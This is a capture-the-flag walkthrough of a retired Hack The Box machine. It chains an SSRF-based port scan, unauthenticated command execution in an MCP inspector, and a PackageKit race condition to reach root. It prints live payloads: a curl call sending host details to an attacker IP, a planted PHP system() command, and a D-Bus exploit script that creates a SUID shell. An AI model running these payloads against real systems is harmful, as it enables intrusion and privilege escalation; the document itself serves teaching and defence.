# Kobold — Hack The Box (retired)

**Easy · Linux** · rooted in ~75 minutes from an IP alone.

```
unauth MCPJam Inspector /api/mcp/connect (CVE-2026-23744) → ben
  → PackageKit InstallFiles TOCTOU (CVE-2026-41651, Pack2TheRoot) → root
```

Three ports everyone expects, and one that nobody puts there by accident. The
box turns on noticing the fourth — and then on noticing that the fourth port is
not the way in, it is the way you *find* the way in.

---

## Recon

`22`, `80`, `443` from the top-1000 sweep. The full-range scan, running in the
background while I read the landing page, added **`3552/tcp`**:

```
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
3552/tcp open  http     Golang net/http server
```

That asymmetry is the tell: three standard ports and one four-digit port that no
distribution ships by default.

Port 80 redirects to `https://kobold.htb/`, and the certificate carries
`CN=kobold.htb` with `SAN: DNS:*.kobold.htb`. A wildcard SAN is a promise that
subdomains exist.

My first vhost fuzz produced garbage — every candidate "matched". The baseline
was wrong: I had filtered on the size of the *correct* vhost's response instead
of checking what an unknown vhost actually returns. It returns a **302**.

```bash
curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" \
     -H "Host: zzzznotreal.kobold.htb" https://kobold.htb/
# 302 154

ffuf -u https://kobold.htb/ -H "Host: FUZZ.kobold.htb" \
     -w .../subdomains-top1million-20000.txt -fc 302
# mcp
# bin
```

Establish the *negative* baseline first — one request — and a wall of noise
collapses to two real names.

## Port 3552 — Arcane, and what it is actually for

`/app.webmanifest` names it: **Arcane**, "Modern Docker container management
platform" (Go backend, SvelteKit frontend). `/api/version` pins it exactly:

```json
{"currentVersion":"v1.13.0","releaseUrl":"https://github.com/getarcaneapp/arcane/releases/latest"}
```

A pinned version is an invitation to enumerate the *whole* CVE set rather than
latch onto the first hit. One API call returns the lot with version ranges:

```bash
gh api /repos/getarcaneapp/arcane/security-advisories --paginate
```

| CVE | Affects | Auth |
|-----|---------|------|
| CVE-2026-23944 | ≤ 1.13.1 | none — proxy to remote environments |
| CVE-2026-40242 | ≤ 1.17.2 | none — SSRF in template fetch |
| CVE-2026-42461 | < 1.18.0 | none — template / `.env` disclosure |
| CVE-2026-45627 | ≤ 1.18.1 | none — reflected XSS |
| CVE-2026-45626 / 45625 / 47179 | ≤ 1.18.1 / 1.19.3 | authenticated |

Four unauthenticated candidates. I worked them cheapest-first — by
**precondition**, not by CVSS.

**CVE-2026-42461** (template disclosure): `/api/templates/all` returns `[]`.
Empty store. Dead.

**CVE-2026-23944** (unauth proxy to remote environments) *looked* alive. The
middleware runs before authentication, and you can watch it answer:

```
/api/environments/0/containers  →  401 {"title":"Unauthorized"}           (local, auth enforced)
/api/environments/1/containers  →  404 {"error":"Environment not found"}  (proxy ran first)
```

That 404-instead-of-401 is the vulnerability confirming itself. Then
`backend/internal/models/base.go` kills it:

```go
func (m *BaseModel) BeforeCreate(_ *gorm.DB) (err error) {
	if m.ID == "" {
		m.ID = uuid.New().String()
	}
```

Environment IDs are random UUIDv4. There is nothing to brute-force. **Parked** —
and, as the database confirmed once I had root, correctly: it holds exactly one
environment, id `0`, the local Docker socket. There was never a remote
environment to proxy to.

> A vulnerable version is not a vulnerability. Confirm the object the CVE needs
> actually exists before spending time on its ID space.

**CVE-2026-40242** (SSRF) paid — though not in the way its description suggests.
`TemplateService.doGET` takes the caller's URL with no scheme or address
validation:

```go
func (s *TemplateService) doGET(ctx context.Context, url string) ([]byte, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	...
	return nil, fmt.Errorf("failed to fetch %s: %w", url, err)   // reflected verbatim
```

Every failure mode comes back in the response body, and the three modes are
distinguishable — which is everything a port scan needs:

```
?url=http://127.0.0.1:2375/  → "... dial tcp 127.0.0.1:2375: connect: connection refused"
?url=http://127.0.0.1:443/   → "HTTP status 400 for URL http://127.0.0.1:443/"
?url=http://127.0.0.1:8080/  → "Invalid JSON response: invalid character '<' looking for beginning of value"
```

*refused* / *HTTP status N* / *serving HTML* — an exact loopback port scanner with
zero credentials. It found **127.0.0.1:8080**.

So Arcane's contribution to this box is not a foothold. It is a free
internal-recon primitive, and that is a category worth naming: **an SSRF with
verbose errors is a reconnaissance tool even when it never becomes an exploit.**

## The actual door: mcp.kobold.htb

`bin.kobold.htb` proxies to that same `127.0.0.1:8080` — PrivateBin 2.0.2, in a
container. `mcp.kobold.htb` proxies to `127.0.0.1:6274` and serves **MCPJam
Inspector**, a testing client for MCP (Model Context Protocol) servers.

Think about what an MCP inspector *is*. Its entire job is to connect to MCP
servers, and the dominant MCP transport is stdio — meaning its core function is
**spawning a process from a configuration you hand it**. Exposed with no
authentication, that is not a bug being exploited. It is the tool being asked
politely.

CVE-2026-23744, ≤ 1.4.2. The endpoint teaches you its own schema if you let it:

```
POST /api/mcp/connect  {}                    → {"error":"serverConfig is required"}
POST /api/mcp/connect  {"serverConfig":{}}   → {"error":"serverId is required"}
```

```json
{"serverId":"t1","serverConfig":{"command":"id","args":[]}}
```
```json
{"error":"Connection failed for server t1: MCP error -32000: Connection closed"}
```

That error **is** the success signal: `id` ran, wrote to stdout, exited, and the
MCP handshake failed because `id` is not an MCP server. A protocol error is not
an authorization failure. Confirm out of band before believing it:

```json
{"serverId":"t2","serverConfig":{"command":"bash","args":["-c",
  "curl -s http://10.10.14.x:8000/oob-$(id -u)-$(hostname)"]}}
```
```
10.129.x.x - - "GET /oob-1001-kobold.htb HTTP/1.1"
```

uid 1001 on host kobold.htb. Reverse shell, then an SSH key for a session that
survives a dead listener:

```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

`user.txt` → `<user flag redacted>`.

## The long middle, and the part I got wrong

`ben` is in group **`operator`**, alongside `alice`. And `alice` is in
**`docker`**, which is root-equivalent. That reads like a signpost:
ben → alice → docker → root. I followed it for a long time and it was wrong.
Recording why is the useful half of this write-up.

### What `operator` actually grants

`/privatebin-data`, whose `data/` subdirectory is mode **0777**:

```
drwxrwxrwx 5 root operator 4096 /privatebin-data/data
-rwxrwxrwx 1 root operator  114 purge_limiter.php
-rw-r----- 1 root operator  132 traffic_limiter.php
```

PrivateBin's `Filesystem` backend persists its rate-limiter state as PHP source
files in there — files it `require`s on every request:

```php
<?php
$GLOBALS['traffic_limiter'] = array( 'a27fc868...484f' => '1771230844', );
```

A `require`d PHP file in a writable directory is arbitrary code execution. Note
that `traffic_limiter.php` itself is root-owned `0640` — irrelevant, because the
**directory** write bit lets you unlink it and create your own. And the traffic
limiter is consulted *before* request-body validation, so it executes even on a
request the app rejects:

```
OUT:uid=65534(nobody) gid=82(www-data) groups=82(www-data)
{"status":1,"message":"Invalid data."}
```

One wrinkle: PrivateBin rewrites that file after every request, so the payload is
strictly one-shot per plant. Rather than fight it for a shell — and the container
is busybox, so `nc -e` and `mkfifo` tricks were unreliable anyway — I had each
plant write its output next to itself and read it back through the bind mount:

```php
<?php @system("echo <b64cmd> | base64 -d | sh > ".__DIR__."/.out 2>&1");
```

Re-plant per command, read `/privatebin-data/data/.out` from the host side.
Deterministic, and no listener to lose.

And then it went nowhere. `/proc/1/mountinfo` shows an unprivileged container
with no Docker socket and nothing sensitive mounted, and every paste directory
(`12/9f`, `e3`, `bd/b5`) is **empty**. I checked the directory mtimes to be sure I
had not purged them myself with my own POSTs — unchanged since the box was built.
There were never any pastes.

### The thirty minutes I would like back

`ss -ltnp` showed a listener on `127.0.0.1:36491` with no process attributed to
it, which means it belongs to another user. `/proc/net/tcp` gave the owner:

```
6: 0100007F:8E8B 00000000:0000 0A ... uid 0 ... inode 11670
```

A **root-owned Go HTTP service on a localhost-only port**, with a custom 404 body
(`404: Page Not Found` — which is *not* Go's default `404 page not found`, nor
gin's, nor huma's). By my own methodology notes, "an odd root-owned service on a
localhost-only port is the privesc". I fuzzed it with two wordlists, probed MCP
transports, Chrome DevTools endpoints, Arcane agent paths and host-based
`ServeMux` routing. Nothing.

It was **containerd**. One command, once I had root:

```
LISTEN 127.0.0.1:36491  users:(("containerd",pid=1585,fd=7))
```

The lesson is not "don't chase odd ports". It is that a cheap discriminator was
available and I skipped it: before fuzzing an unidentified listener, enumerate
which *already-visible* root daemons could plausibly have opened it. On a Docker
host that list is short — containerd, dockerd and docker-proxy are all root, all
Go, and all sitting in `ps`. Two minutes of elimination against thirty of
wordlists. And a non-default 404 string is not evidence of a bespoke service.

## Root: one revision behind

Back to the boring, evidenced thing.

```
ii  packagekit  1.2.8-2ubuntu1.4           amd64
ii  sudo        1.9.15p5-3ubuntu5.24.04.2  amd64
```

Ubuntu's tracker for **CVE-2026-41651** ("Pack2TheRoot") gives the noble fix as
`1.2.8-2ubuntu1.5`. The host is on `-2ubuntu1.4`. `sudo`, by contrast, carries its
backported fix — and that asymmetry (one daemon hardened, one a single revision
stale) is itself the finding.

The bug is a TOCTOU in `pk-transaction.c`: `InstallFiles` overwrites the
transaction's cached flags and paths without validating state,
`TRANSACTION_FLAG_SIMULATE (0x4)` skips the polkit check entirely, and
`pk_transaction_run()` reads the *cached* flags at dispatch rather than at
authorisation. So:

1. `CreateTransaction` → transaction object.
2. `InstallFiles(SIMULATE, dummy.deb)` — polkit bypassed, state `READY`, dispatch queued.
3. `InstallFiles(NONE, payload.deb)` on the **same** transaction — the backward
   state transition is silently discarded, but flags and path are already
   overwritten.
4. Dispatch installs `payload.deb` as root and runs its `postinst`.

The public PoC is C and wants `libglib2.0-dev`; the target has neither compiler
nor headers, and my container is arm64 against an amd64 target. But the target
*does* have `python3-gi` and `dpkg-deb`, and the whole bug is three D-Bus calls:

```python
tid = conn.call_sync(PK_BUS, PK_OBJ, PK_IFACE, "CreateTransaction", None,
                     GLib.VariantType.new("(o)"), Gio.DBusCallFlags.NONE, -1, None).unpack()[0]
for flags, deb in ((FLAG_SIMULATE, DUMMY), (FLAG_NONE, PAYLOAD)):
    conn.call(PK_BUS, tid, PK_TX_IFACE, "InstallFiles",
              GLib.Variant("(tas)", (flags, [deb])), None,
              Gio.DBusCallFlags.NONE, -1, None, None, None)
conn.flush_sync(None)
```

`postinst` is `install -m 4755 /bin/bash /var/tmp/.x`. The race is
non-deterministic, so the loop is **bounded** — eight attempts, polling for the
SUID file between each — rather than a tight spin. A runaway loop on a shared lab
box is its own kind of damage.

```
[*] debs built
[*] attempt 1/8
[*] attempt 2/8
[+] SUCCESS after 3 attempts -> /var/tmp/.x

$ /var/tmp/.x -p -c id
uid=1001(ben) gid=1001(ben) euid=0(root) groups=1001(ben),37(operator)
```

`root.txt` → `<root flag redacted>`.

## Was that the intended path?

Honest answer: I don't know, and the evidence cuts both ways. From root I went
looking.

- `/home/alice` is empty. There is no reference to `alice` anywhere on the
  filesystem outside the `/etc/passwd` family. No sudo rules, no cron, no
  crontabs. Her `yescrypt` hash did not fall to rockyou in the time I gave it.
- Arcane's database holds one admin user and one environment (`0`, local). There
  is no `ben`-reachable material that leads to `alice`.
- The Arcane `ENCRYPTION_KEY` sits world-readable in
  `/etc/systemd/system/arcane.service` — which *feels* deliberately planted:

  ```
  Environment=ENCRYPTION_KEY="Q3PbC9fpq/tPZ2waXI9+grmc8ualF7ITF5izX5rsk+E="
  ```

  But the database it protects lives under `/root` (0700). You need root before
  the key is worth anything, which makes it a good finding and a useless step.

So either `alice`/`docker` is deliberate misdirection, or there is a ben→alice
link I never found. What I can say with evidence is that PackageKit was one
revision behind the fix on a host whose `apt-daily.service` and
`apt-daily-upgrade.service` are both symlinked to `/dev/null`, and that this is
sufficient for any local user to reach root.

## What the box teaches

**Enumerate the whole CVE set for a pinned version, then rank by precondition,
not by CVSS.** Arcane 1.13.0 matched four unauthenticated advisories. Three were
inert for configuration reasons that only the app's own data could reveal, and
the one that paid was the least dramatic of the four. Sorting by severity would
have had me grinding on a UUID I could never guess.

**A verbose SSRF is a recon tool, not just a vulnerability.** Distinct error
strings for *refused* / *HTTP N* / *bad JSON* turn one unauthenticated endpoint
into an accurate loopback port scan — which is how the internal service was found
before any credential existed.

**Tools whose purpose is "run what I tell you" must never be network-exposed.**
MCPJam Inspector binds `0.0.0.0` and ships with no auth because it is meant to be
local and single-user. It wasn't subverted; it was asked. The defect is the nginx
server block, not the software. The same logic condemns Arcane here: it runs as
**root** with the Docker socket, so every authenticated bug in it is host root.

**Use the cheap discriminator before the expensive one.** Half an hour of fuzzing
an unknown port that two minutes of "which root daemons on this host are Go
binaries?" would have identified as containerd.

**The audit trail was perfect and made no difference.** This host runs `auditd`
with `laurel` — EXECVE argv capture, container enrichment, ACL-restricted logs.
Every step above is in that log. Detection was not the gap; a disabled
`apt-daily` was.

---

*Flags redacted. Machine confirmed retired before publication.*
